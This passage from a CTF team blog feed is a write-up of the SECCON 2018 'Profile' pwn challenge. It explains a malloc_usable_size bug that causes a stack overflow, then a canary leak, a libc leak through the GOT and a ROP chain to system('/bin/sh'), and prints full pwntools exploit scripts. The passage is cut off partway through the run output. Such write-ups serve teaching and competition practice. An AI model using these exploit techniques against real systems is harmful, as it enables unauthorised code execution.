rel="noopener">https://theswissbay.ch/pdf/_to_sort/heap-exploitation.pdf</a></li><li><a href="https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/" target="_blank" rel="noopener">https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://mega.nz/#!XvInEABK!7R3-Hbl7dGY-7FGVuTxP25NkQfd5OQBn6P9thxk3l7U&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;gryffindor&lt;/a&gt;&lt;br&gt;&lt;a href
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="House of Force" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/House-of-Force/"/>
    
      <category term="Heap Overflow" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Heap-Overflow/"/>
    
      <category term="Format String" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"/>
    
    
      <category term="format_string" scheme="https://teamrocketist.github.io/tags/format-string/"/>
    
      <category term="heap_overflow" scheme="https://teamrocketist.github.io/tags/heap-overflow/"/>
    
      <category term="inctf2017" scheme="https://teamrocketist.github.io/tags/inctf2017/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Seccon 2018 - Profile</title>
    <link href="https://teamrocketist.github.io/2018/11/04/Pwn-Seccon-2018-Profile/"/>
    <id>https://teamrocketist.github.io/2018/11/04/Pwn-Seccon-2018-Profile/</id>
    <published>2018-11-04T16:46:32.000Z</published>
    <updated>2018-11-06T03:57:42.860Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Profile<br>255<br>64 Solves<br>Host: profile.pwn.seccon.jp<br>Port: 28553<br>profile_e814c1a78e80ed250c17e94585224b3f3be9d383<br>libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253</p></blockquote><p>We have a 64 bit binary, we can start by checking it’s security with <a href="http://docs.pwntools.com/en/stable/commandline.html?highlight=checksec#pwn-checksec" target="_blank" rel="noopener">checksec</a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec profile_e814c1a78e80ed250c17e94585224b3f3be9d383 </span><br><span class="line">[*] <span class="string">'/ctf/work/ctf/seccon2018/pwn/profile/profile_e814c1a78e80ed250c17e94585224b3f3be9d383'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="ELF-protections-and-how-to-bypass-them"><a href="#ELF-protections-and-how-to-bypass-them" class="headerlink" title="ELF protections and how to bypass them:"></a>ELF protections and how to bypass them:</h2><p><strong>NX (Non-executable stack)</strong> this can be circumvented using <strong>ROP</strong> (Return oriented programming).  </p><p><strong>Partial RELRO</strong> makes almost no difference, other than it forces the <strong>GOT</strong> to come before the <strong>BSS</strong> in memory, eliminating the risk of a buffer overflows on a global variable <strong>overwriting</strong> GOT entries.</p><p><strong>Stack Canary</strong> random value positioned just before the <strong>saved ebp</strong> and the <strong>return address</strong>, if this value is somehow changed for example with a buffer overflow, the program throws an exception preventing an attack, one way to bypass this is by finding a way to <strong>leak addresses</strong> from the stack , the value we want is obviously the canary itself.</p><h2 id="Finding-a-way-to-leak-addresses"><a href="#Finding-a-way-to-leak-addresses" class="headerlink" title="Finding a way to leak addresses"></a>Finding a way to leak addresses</h2><p>Resuming a little bit what the program does, we can create a profile with the specific fields <strong>name</strong>, <strong>age</strong> and <strong>message</strong>, later on we are presented a menu where we can update our message, print our profile and exit.</p><p>The profile creation part in the beginning doesn’t seem to have any kind of vulnerability, the strings are being created with <strong>std::string</strong> which is being defined using the <strong>std::basic_string</strong> class template, which has three template parameters, on ida a <strong>std::string</strong> shows up like this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v14, argv);</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/v7VS7kx.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/v7VS7kx.png" alt=""><br></a></p><p>Nothing seems wrong in here, we have a lot of string declarations with <strong>std::string</strong>, the input reading from the user <strong>cin</strong> class from c++ which is fine against overflows.</p><p>The only thing left now is the methods of the class profile <strong>Profile::update_msg</strong> and <strong>Profile::show</strong>, so just by reading the names of this methods we can already deduce what is going to happen, <strong>update_msg</strong> is probably where we are going to find some kind of <strong>overflow</strong> (receives user input to update profile msg), and on <strong>show</strong> is probably where we are going to <strong>leak addresses</strong> from memory, because it involves printing fields from our class object profile.</p><h3 id="Profile-update-msg"><a href="#Profile-update-msg" class="headerlink" title="Profile::update_msg"></a>Profile::update_msg</h3><p>Once again <strong>std::string</strong> is being used, one particular optimization of the <strong>std::string</strong> object is when receives small strings it creates <strong>small buffer</strong>, which saves <strong>dynamic allocations</strong>. Which means, when small strings are passed to the constructor (len &lt; 16) it string is stored in the <strong>stack</strong> instead of allocating on the heap, we can verify this easily if we create a c++ program and modify the new constructor to print some debugging :</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// replace operator new and delete to log allocations</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="built_in">std</span>::<span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"[Allocating "</span> &lt;&lt; n &lt;&lt; <span class="string">" bytes]"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">malloc</span>(n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">void</span>* p)</span> <span class="title">throw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">": "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">string</span>(i, <span class="string">'='</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The output</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0:</span><br><span class="line">1: =</span><br><span class="line">2: ==</span><br><span class="line">3: ===</span><br><span class="line">4: ====</span><br><span class="line">5: =====</span><br><span class="line">6: ======</span><br><span class="line">7: =======</span><br><span class="line">8: ========</span><br><span class="line">9: =========</span><br><span class="line">10: ==========</span><br><span class="line">11: ===========</span><br><span class="line">12: ============</span><br><span class="line">13: =============</span><br><span class="line">14: ==============</span><br><span class="line">15: ===============</span><br><span class="line">[Allocating 32 bytes]16: ================</span><br><span class="line">[Allocating 32 bytes]17: =================</span><br><span class="line">[Allocating 32 bytes]18: ==================</span><br><span class="line">[Allocating 32 bytes]19: ===================</span><br><span class="line">[Allocating 32 bytes]20: ====================</span><br><span class="line">[Allocating 32 bytes]21: =====================</span><br><span class="line">[Allocating 32 bytes]22: ======================</span><br><span class="line">[Allocating 32 bytes]23: =======================</span><br></pre></td></tr></table></figure><p>Now looking at the code right after the declaration of <strong>std:string</strong> a function named <strong>MALLOC_USABLE_SIZE</strong> according to the man pages it says it obtains size of block of memory allocated from <strong><em>heap</em></strong> , but what happens if nothing we pass a pointer from the stack? the unexpected will happen this function will return -8 (0xfffffffffffffff8), this value <strong>won’t</strong> be interpreted as <strong>negative</strong> but as a very <strong>high</strong> number because the variables are declared as <strong>unsigned ints</strong>, this will later be passed to the stop loop condition of  <strong>getn</strong> function, entering into a infinite loop and only stops when a new line (0xa) is found which will lead to a buffer overflow.</p><p>UpdateMessage function<br><a data-fancybox="gallery" href="https://i.imgur.com/MNcth1P.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/MNcth1P.png" alt=""><br></a></p><p>getn function<br><a data-fancybox="gallery" href="https://i.imgur.com/KZZH881.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KZZH881.png" alt=""><br></a></p><p>On GDB after <strong>MALLOC_USABLE_SIZE</strong>, the value is returned into <strong>rax</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/ziYa5dp.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ziYa5dp.png" alt=""><br></a></p><p>Now if we do some testing to check what is in the stack after we use update message with 8<em>‘A’ and 8</em>‘B’:  </p><p>The values from the stack<br><a data-fancybox="gallery" href="https://i.imgur.com/G0WEEIa.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/G0WEEIa.png" alt=""><br></a></p><p>Some gdb commands that might help you finding the <strong>stack canary</strong> and <strong>ret addr</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/8m0MzpC.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/8m0MzpC.png" alt=""><br></a></p><p>Leaking the <strong>libc</strong> is easy, we just need to set a got address to leak it, but how do we leak the <strong>canary</strong>? We need to find a way to leak an address from the stack, having this we can calculate its offset to the canary address, but how do we do this? we can take <strong>advantage</strong> of the fact that we have a <strong>large part</strong> of the address of the pointer to profile.name, if we only modify the <strong>last byte</strong> of the <strong>pointer of profile.name</strong> and we just need to keep iterating from <strong>0x00</strong> to <strong>0xff</strong> until we reach the address of the string that we inserted 0x4141414141414141, after that it is a matter of only adding another 0x10 and we can expose that address of the stack, getting this we just need to do the difference between this address and the canary.</p><p>The leaked values will show up after “Name: “, because we are changing the value of the pointer to profile.name in the stack! with this if we print the profile, the profile.name will print the pointer we changed…</p><p>Part of the code to calculate this offset:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="comment">#d = os.environ</span></span><br><span class="line">        <span class="comment">#d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253'</span></span><br><span class="line">        <span class="keyword">return</span> process(filename, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc-2.23'</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakAddr</span><span class="params">(addr, bytes_to_read=<span class="number">6</span>)</span>:</span></span><br><span class="line">        r.recv()</span><br><span class="line">        r.sendline(<span class="string">'1'</span>)</span><br><span class="line">        r.recv()</span><br><span class="line">        r.sendline(<span class="string">'A'</span>*<span class="number">8</span> + <span class="string">'B'</span>*<span class="number">8</span> + addr)</span><br><span class="line">        r.recv()</span><br><span class="line">        r.sendline(<span class="string">'2'</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'Name : '</span>)</span><br><span class="line">        <span class="keyword">return</span> u64(r.recv(bytes_to_read).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">filename = <span class="string">'./profile_e814c1a78e80ed250c17e94585224b3f3be9d383'</span></span><br><span class="line">host = <span class="string">'profile.pwn.seccon.jp'</span></span><br><span class="line">port = <span class="number">28553</span></span><br><span class="line">local = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">binary = ELF(filename)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.23'</span>)</span><br><span class="line"></span><br><span class="line">POPRET = <span class="number">0x401713</span></span><br><span class="line"></span><br><span class="line">LEAKED_ADDR = <span class="number">0x0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">r = getConn()</span><br><span class="line">gdb.attach(r, <span class="string">'''</span></span><br><span class="line"><span class="string">   b *0x4011e1</span></span><br><span class="line"><span class="string">   b *0x4013C9</span></span><br><span class="line"><span class="string">   b *0x40148D</span></span><br><span class="line"><span class="string">   '''</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'2'</span>*<span class="number">15</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'3'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'4'</span>)</span><br><span class="line">log.info(<span class="string">'----------Searching for the offset-------------'</span>) </span><br><span class="line"><span class="keyword">while</span> LEAKED_ADDR != <span class="number">0x414141414141</span> <span class="keyword">and</span> i &lt; <span class="number">0xff</span>:</span><br><span class="line">        LEAKED_ADDR = leakAddr(p8(i))</span><br><span class="line">        log.info(<span class="string">"LEAKED ADDR 0x%x 0x%x"</span> % (LEAKED_ADDR,i))</span><br><span class="line">        i += <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">0xff</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Unluckly couldn\'t find the string position'</span></span><br><span class="line">        r.close()</span><br><span class="line">        exit(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">LEAKED_ADDR = leakAddr(p8(i))</span><br><span class="line">log.info(<span class="string">'------------------Offset Found-----------------'</span>)</span><br><span class="line"></span><br><span class="line">CANARY_ADDR = LEAKED_ADDR+<span class="number">0x28</span></span><br><span class="line">log.info(<span class="string">"LEAKED ADDR 0x%x"</span> % LEAKED_ADDR)</span><br><span class="line">log.info(<span class="string">"CANARY ADDR 0x%x"</span> % (CANARY_ADDR))</span><br><span class="line">CANARY = leakAddr(p64(CANARY_ADDR) ,bytes_to_read=<span class="number">8</span>)</span><br><span class="line">log.info(<span class="string">"Canary 0x%x"</span> % CANARY)</span><br></pre></td></tr></table></figure></p><h2 id="Leaking-libc"><a href="#Leaking-libc" class="headerlink" title="Leaking libc"></a>Leaking libc</h2><p>Now that we have the stack canary we can easily leak libc, we don’t even need to calculate offsets we just need to use the global offset table, we can use the GOT entry of <strong>read</strong>, and then calculate the offsets with the help of pwntools since we are loading the libc file in the beginning:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">READ = leakAddr(p64(binary.got[<span class="string">'read'</span>]))</span><br><span class="line">LIBCBASE = READ - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">BINSH = LIBCBASE + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">EXIT = LIBCBASE + libc.symbols[<span class="string">'exit'</span>]</span><br><span class="line">log.info(<span class="string">"READ 0x%x"</span> % READ)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</span><br><span class="line">log.info(<span class="string">"BINSH 0x%x"</span> % BINSH)</span><br></pre></td></tr></table></figure><p>Now that we have all the libc we just need to build our rop chain, we need to find a gadget that puts <strong>/bin/sh</strong> into rdi, we can do this with <strong>POP RDI ; RET</strong> which will get the value in the top of the stack into RDI, after this we can call system, for a more detailed description you can read this <a href="https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/">write up</a> on about to write a ropchain (it’s a little different because on this link the binary is statically linked instead of dynamically).</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ropchain = <span class="string">''</span></span><br><span class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></span><br><span class="line">ropchain += p64(BINSH) <span class="comment"># BINSH ADDRESS ARG[1]</span></span><br><span class="line">ropchain += p64(SYSTEM) <span class="comment"># SYSTEM function "call"</span></span><br><span class="line"></span><br><span class="line">ropchain += p64(EXIT) <span class="comment"># EXIT Actually useless you don't really</span></span><br><span class="line"><span class="comment">#                       need to exit, but I usually like to exit without an error</span></span><br></pre></td></tr></table></figure><p>And now that we have everything we can calculate the final offsets:<br><a data-fancybox="gallery" href="https://i.imgur.com/qf4bPYj.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/qf4bPYj.png" alt=""><br></a><br>The rest of the code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(p64(<span class="number">0</span>) * <span class="number">7</span> + p64(CANARY) + p64(<span class="number">0</span>)*<span class="number">3</span> + ropchain)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'0'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>The full code exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#d = os.environ</span></span><br><span class="line">    <span class="comment">#d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253'</span></span><br><span class="line">    <span class="keyword">return</span> process(filename, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc-2.23'</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakAddr</span><span class="params">(addr, bytes_to_read=<span class="number">6</span>)</span>:</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">'A'</span>*<span class="number">8</span> + <span class="string">'B'</span>*<span class="number">8</span> + addr)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Name : '</span>)</span><br><span class="line">    <span class="keyword">return</span> u64(r.recv(bytes_to_read).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">filename = <span class="string">'./profile_e814c1a78e80ed250c17e94585224b3f3be9d383'</span></span><br><span class="line">host = <span class="string">'profile.pwn.seccon.jp'</span></span><br><span class="line">port = <span class="number">28553</span></span><br><span class="line">local = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">binary = ELF(filename)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.23'</span>)</span><br><span class="line"></span><br><span class="line">POPRET = <span class="number">0x401713</span></span><br><span class="line"></span><br><span class="line">LEAKED_ADDR = <span class="number">0x0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">r = getConn()</span><br><span class="line"><span class="comment">#gdb.attach(r, '''</span></span><br><span class="line"><span class="comment">#   b *0x4011e1</span></span><br><span class="line"><span class="comment">#   b *0x4013C9</span></span><br><span class="line"><span class="comment">#   b *0x40148D</span></span><br><span class="line"><span class="comment">#   ''')</span></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'2'</span>*<span class="number">15</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'3'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'4'</span>)</span><br><span class="line">log.info(<span class="string">'----------Searching for the offset-------------'</span>) </span><br><span class="line"><span class="keyword">while</span> LEAKED_ADDR != <span class="number">0x414141414141</span> <span class="keyword">and</span> i &lt; <span class="number">0xff</span>:</span><br><span class="line">    LEAKED_ADDR = leakAddr(p8(i))</span><br><span class="line">    log.info(<span class="string">"LEAKED ADDR 0x%x 0x%x"</span> % (LEAKED_ADDR,i))</span><br><span class="line">    i += <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">0xff</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Unluckly couldn\'t find the string position'</span></span><br><span class="line">    r.close()</span><br><span class="line">    exit(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">LEAKED_ADDR = leakAddr(p8(i))</span><br><span class="line">log.info(<span class="string">'------------------Offset Found-----------------'</span>)</span><br><span class="line"></span><br><span class="line">CANARY_ADDR = LEAKED_ADDR+<span class="number">0x28</span></span><br><span class="line">log.info(<span class="string">"LEAKED ADDR 0x%x"</span> % LEAKED_ADDR)</span><br><span class="line">log.info(<span class="string">"CANARY ADDR 0x%x"</span> % (CANARY_ADDR))</span><br><span class="line"></span><br><span class="line">CANARY = leakAddr(p64(CANARY_ADDR) ,bytes_to_read=<span class="number">8</span>)</span><br><span class="line">log.info(<span class="string">"Canary 0x%x"</span> % CANARY)</span><br><span class="line"></span><br><span class="line">READ = leakAddr(p64(binary.got[<span class="string">'read'</span>]))</span><br><span class="line">LIBCBASE = READ - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">BINSH = LIBCBASE + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">EXIT = LIBCBASE + libc.symbols[<span class="string">'exit'</span>]</span><br><span class="line">log.info(<span class="string">"READ 0x%x"</span> % READ)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</span><br><span class="line">log.info(<span class="string">"BINSH 0x%x"</span> % BINSH)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">ropchain = <span class="string">''</span></span><br><span class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></span><br><span class="line">ropchain += p64(BINSH) <span class="comment"># BINSH ADDRESS ARG[1]</span></span><br><span class="line">ropchain += p64(SYSTEM) <span class="comment"># SYSTEM function "call"</span></span><br><span class="line"></span><br><span class="line">ropchain += p64(EXIT) <span class="comment"># EXIT</span></span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(p64(<span class="number">0</span>) * <span class="number">7</span> + p64(CANARY) + p64(<span class="number">0</span>)*<span class="number">3</span> + ropchain)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'0'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 